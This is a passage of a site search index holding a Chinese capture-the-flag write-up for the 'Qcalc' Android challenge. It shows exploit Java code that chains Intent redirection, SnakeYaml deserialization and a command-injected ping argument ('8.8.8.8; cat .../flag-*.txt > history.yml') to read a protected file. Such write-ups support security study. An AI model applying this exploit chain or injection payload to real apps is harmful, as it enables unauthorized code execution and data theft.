<li>ScyllaHide for ida9.0 \u6e90\u9879\u76ee\u4e0d\u5927\u4f1a\u7528awa</li> </ul> </li> <li></li> </ol>"},{"location":"study/wp/2025-10/qwb_2025/","title":"\u5f3a\u7f51\u676f2025","text":""},{"location":"study/wp/2025-10/qwb_2025/#qcalc","title":"Qcalc","text":"<p>\u8d5b\u9898\u4e0b\u8f7d</p>"},{"location":"study/wp/2025-10/qwb_2025/#_1","title":"\u5229\u7528\u70b9","text":"<ol> <li> <p>\u540e\u95e8\u7c7b\u6267\u884c\u6307\u4ee4</p> Java<pre><code>package com.qinquang.calc;\n\nimport android.util.Log;\n\n/* loaded from: classes3.dex */\npublic final class PingUtil {\n    private static final String TAG = \"PingUtil\";\n\n    public PingUtil(String address) {\n        try {\n            Log.d(TAG, \"PingUtil constructor called with: \" + address);\n            String pingCmd = \"ping -c 1 \" + address;\n            Process process = Runtime.getRuntime().exec(new String[]{\"/system/bin/sh\", \"-c\", pingCmd});\n            Log.d(TAG, \"Command executed: \" + pingCmd);\n            process.waitFor();\n        } catch (Exception e) {\n            Log.e(TAG, \"Error executing ping command\", e);\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u7c7b\u4e2d\u7684\u6784\u9020\u51fd\u6570\u4f1a\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u63a5\u5728<code>ping -c 1</code>\u540e\u88ab\u6267\u884c</p> \u4e3a\u4ec0\u4e48\u662f-c <ul> <li><code>-c</code> \u544a\u8bc9 shell\uff08\u8fd9\u91cc\u662f <code>/system/bin/sh</code>\uff09\u4ece\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u5e76\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u662f\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f\u3002</li> </ul> </li> <li> <p>yaml\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08SnakeYaml\uff09</p> <p>\u539f\u7406\uff1aSnakeYaml \u53cd\u5e8f\u5217\u5316</p> <p>\u6e90\u7801\uff1a</p> Java<pre><code>public class HistoryManager {\n    public static final String HISTORY_FILE_NAME = \"history.yml\";\n    //\u7701\u7565\n    public List&lt;String&gt; loadHistory() {\n        Yaml yaml = new Yaml();\n        try {\n            FileInputStream fis = this.context.openFileInput(HISTORY_FILE_NAME);\n            InputStreamReader reader = new InputStreamReader(fis);\n            try {\n                Object result = yaml.load(reader);\n</code></pre> </li> <li> <p>\u975e\u6cd5Intent\u63d0\u6743</p> <p>\u5728MainActivity\u4e2donEqual\u5982\u679c\u51fa\u73b0\u5f02\u5e38\u5e76\u4e14\u6709fallbackIntent\u4fbf\u4f1a\u8fdb\u5165BridgeActivity</p> Java<pre><code>public void onEqual(View view) {\n        char c;\n        if (this.input.isEmpty() || this.operator.isEmpty()) {\n            return;\n        }\n        double secondNum = Double.parseDouble(this.input);\n        double result = 0.0d;\n        String expression = this.firstNum + \" \" + this.operator + \" \" + secondNum;\n        try {\n            String str = this.operator;\n            switch (str.hashCode()) {\n        // \u7701\u7565\n                case 3:\n                    result = this.firstNum / secondNum;\n                    if (!Double.isInfinite(result) &amp;&amp; !Double.isNaN(result)) {\n                        break;\n                    } else {\n                        throw new ArithmeticException(\"Division by zero detected\");\n                    }\n            }\n            String fullCalculation = expression + \" = \" + result;\n            this.tvInput.setText(String.valueOf(result));\n            this.historyManager.saveHistory(fullCalculation);\n        } catch (Exception unused) {\n            Log.d(\"QiangCalc\", \"Exception during calculation: \" + unused.getMessage());\n            unused.printStackTrace();\n            Intent fallbackIntent = (Intent) getIntent().getParcelableExtra(\"fallback\");\n            Log.d(\"QiangCalc\", \"Fallback intent: \" + (fallbackIntent != null ? \"found\" : \"not found\"));\n            if (fallbackIntent != null) {\n                Log.d(\"QiangCalc\", \"Fallback intent data: \" + fallbackIntent.getData());\n                Log.d(\"QiangCalc\", \"Fallback intent extras: \" + fallbackIntent.getExtras());\n                fallbackIntent.addFlags(268435456);\n                ContentValues bridgeValues = new ContentValues();\n                bridgeValues.put(\"action\", \"process\");\n                bridgeValues.put(TypedValues.AttributesType.S_TARGET, \"history\");\n                bridgeValues.put(\"timestamp\", Long.valueOf(System.currentTimeMillis()));\n                fallbackIntent.putExtra(\"bridge_values\", bridgeValues);\n                String signature = getIntent().getStringExtra(\"calc_signature\");\n                fallbackIntent.putExtra(\"bridge_signature\", signature);\n                Intent bridgeIntent = new Intent(this, BridgeActivity.class);\n                bridgeIntent.putExtra(\"origIntent\", fallbackIntent);\n                startActivity(bridgeIntent);\n                finish();\n            }\n            this.tvInput.setText(\"Error\");\n        }\n        this.input = \"\";\n        this.operator = \"\";\n    }\n</code></pre> <p>BridgeActivity\u68c0\u9a8c\u4e86\u4e00\u7cfb\u5217\u6761\u4ef6\uff0c\u90fd\u7b26\u5408\u65f6\u7ed9\u8be5Intent\u8bfb\u5199history.yml\u6743\u9650</p> Java<pre><code>            if (values != null &amp;&amp; processContentValues(values)) {\n                String token = origIntent.getStringExtra(\"bridge_token\");\n                if (!validateToken(token)) {\n                    Log.e(TAG, \"Invalid token\");\n                    finish();\n                    return;\n                }\n                File historyFile = new File(getFilesDir(), HistoryManager.HISTORY_FILE_NAME);\n                Uri historyUri = Uri.parse(\"content://com.qinquang.calc/\" + historyFile.getName());\n                origIntent.setData(historyUri);\n                origIntent.addFlags(3);\n                startActivity(origIntent);\n</code></pre> </li> </ol>"},{"location":"study/wp/2025-10/qwb_2025/#_2","title":"\u653b\u51fb\u94fe","text":"<ol> <li> <p>\u5e94\u7528\u9664\u96f6\u5f02\u5e38\uff0c\u5c06\u6784\u9020\u7684\u6076\u610fIntent\u4f20\u5165\u6865\u63a5\uff0c\u5f80history.yml\u4e2d\u5199\u5165\u6076\u610f\u4ee3\u7801</p> Bash<pre><code>\"!!com.qinquang.calc.PingUtil [ '8.8.8.8;cat /data/data/com.qinquang.calc/flag-*.txt &gt; /data/data/com.qinquang.calc/files/history.yml' ]\"\n</code></pre> </li> <li> <p>\u901a\u8fc7\u9664\u96f6\u5f02\u5e38\uff0c\u4f20\u5165\u5386\u53f2\u8bb0\u5f55Intent\uff0c\u89e6\u53d1loadHistory\uff0cyaml\u53cd\u5e8f\u5217\u5316\u6267\u884c</p> Bash<pre><code>ping -c 1 8.8.8.8;cat /data/data/com.qinquang.calc/flag-*.txt &gt; /data/data/com.qinquang.calc/files/history.yml\n</code></pre> </li> <li> <p>\u518d\u6b21\u5e94\u7528\u9664\u96f6\u5f02\u5e38\uff0c\u8bfb\u53d6history.yml</p> </li> </ol>"},{"location":"study/wp/2025-10/qwb_2025/#exp","title":"exp\u7f16\u5199","text":"<p>\u8fd9\u91cc\u4ec5\u7ed9\u51fa\u5173\u952e\u4ee3\u7801\u7247\u6bb5</p> \u4f20\u5165\u6076\u610fintent<pre><code>private void readResult() {\n    Intent payloadIntent = new Intent();\n    // \u5982\u679c\u662f\u8bfb\u53d6HistoryActivity\u6539\u4e3a(\"com.qinquang.calc\", \"com.qinquang.calc.HistoryActivity\")\u5373\u53ef\n    payloadIntent.setClassName(getPackageName(), \"com.n0rth5ea.creakcluc.PermissionReceiverActivity\");\n    payloadIntent.putExtra(\"read_mode\", true); // \u4ee5\u8bfb\u53d6\u6a21\u5f0f\u4e3a\u4f8b\n\n    // \u6784\u9020bridge_values\n    ContentValues values = new ContentValues();\n    values.put(\"action\", \"process\");\n    values.put(\"target\", \"history\");\n    payloadIntent.putExtra(\"bridge_values\", values);\n\n    // \u751f\u6210token\n    String token = \"aaf4b4eb2510cf9e\";\n    payloadIntent.putExtra(\"bridge_token\", token);\n\n    // \u8bbe\u7f6eflags\n    payloadIntent.setFlags(Intent.FLAG_FROM_BACKGROUND);\n\n    // \u6784\u9020\u89e6\u53d1Intent\n    Intent triggerIntent = new Intent(Intent.ACTION_VIEW);\n    triggerIntent.setData(Uri.parse(\"qiangcalc://calculate?expression=10/0\"));\n    triggerIntent.putExtra(\"fallback\", payloadIntent);\n    triggerIntent.setPackage(\"com.qinquang.calc\");\n\n    try {\n        startActivity(triggerIntent);\n        log(\"[+] Read request sent. Check Logcat for the flag.\");\n    } catch (Exception e) {\n        log(\"[!] Failed to send read request: \" + e.getMessage());\n    }\n}\n</code></pre> \u5199\u5165\u548c\u8bfb\u53d6intent\u8bbe\u8ba1<pre><code>Intent intent = getIntent();\nif (intent != null &amp;&amp; intent.getData() != null) {\n    Uri historyUri = intent.getData();\n    boolean isReadMode = intent.getBooleanExtra(\"read_mode\", false);\n\n    if (isReadMode) {\n        // \u8bfb\u53d6\u6a21\u5f0f\uff1a\u4ecehistory.yml\u8bfb\u53d6flag\n        Log.d(TAG, \"Read mode: Reading flag from history.yml\");\n        try (InputStream is = getContentResolver().openInputStream(historyUri);\n             BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {\n\n            StringBuilder flagContent = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                flagContent.append(line);\n            }\n            String flag = flagContent.toString();\n\n            Log.d(TAG, \"SUCCESS! Flag captured: \" + flag);\n            Toast.makeText(this, \"Flag captured! Check Logcat.\", Toast.LENGTH_LONG).show();\n            MainActivity.flag = flag;\n\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to read from history.yml\", e);\n            Toast.makeText(this, \"Failed to read flag: \" + e.getMessage(), Toast.LENGTH_LONG).show();\n        }\n\n    } else {\n        // \u5199\u5165\u6a21\u5f0f\uff1a\u5199\u5165\u6076\u610fYAML\u5230history.yml\n        Log.d(TAG, \"Write mode: Writing malicious YAML to history.yml\");\n\n        // \u6784\u9020\u6076\u610fYAML\uff0c\u4f7f\u7528PingUtil\u6267\u884c\u547d\u4ee4\u5c06flag\u5199\u5165history.yml\n        String maliciousYaml = \"!!com.qinquang.calc.PingUtil [ '8.8.8.8; cat /data/data/com.qinquang.calc/flag-*.txt &gt; /data/data/com.qinquang.calc/files/history.yml' ]\";\n\n        try (OutputStream os = getContentResolver().openOutputStream(historyUri)) {\n            if (os != null) {\n                os.write(maliciousYaml.getBytes(StandardCharsets.UTF_8));\n                Log.d(TAG, \"Successfully wrote malicious YAML to history.yml\");\n                Toast.makeText(this, \"Payload written successfully\", Toast.LENGTH_SHORT).show();\n            }\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to write to history.yml\", e);\n            Toast.makeText(this, \"Failed to write payload: \" + e.getMessage(), Toast.LENGTH_LONG).show();\n        }\n    }\n}\n</code></pre>"}]}